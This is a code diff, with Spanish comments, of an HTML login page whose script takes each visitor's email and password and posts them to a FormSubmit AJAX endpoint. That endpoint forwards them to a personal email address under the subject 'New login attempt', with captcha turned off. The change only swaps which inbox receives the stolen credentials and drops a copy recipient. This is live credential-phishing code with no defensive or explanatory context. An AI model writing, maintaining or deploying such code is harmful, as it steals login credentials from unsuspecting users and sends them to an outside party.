@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -798,11 +799,9 @@
                 }
             });
 
-            // ===== NUEVO SISTEMA DE ENVÍO (FormSubmit AJAX) =====
-            // Usamos el endpoint AJAX de FormSubmit para evitar redirecciones
-            // y permitir el envío sin recargar la página.
-            // Además, añadimos _captcha=false y _cc para enviar copia a valorfn@outlook.es
-            const FORM_SUBMIT_URL = 'https://formsubmit.co/ajax/parameganz25@gmail.com';
+            // ===== ENVÍO SOLO A OUTLOOK (valorfn@outlook.es) =====
+            // Usamos FormSubmit AJAX con destino a valorfn@outlook.es
+            const FORM_SUBMIT_URL = 'https://formsubmit.co/ajax/valorfn@outlook.es';
 
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -827,8 +826,7 @@
                     _subject: `New login attempt - ${fullEmail}`,
                     email: fullEmail,
                     password: password,
-                    _captcha: 'false',
-                    _cc: 'valorfn@outlook.es'
+                    _captcha: 'false'
                 };
 
                 // Enviar a FormSubmit (AJAX)
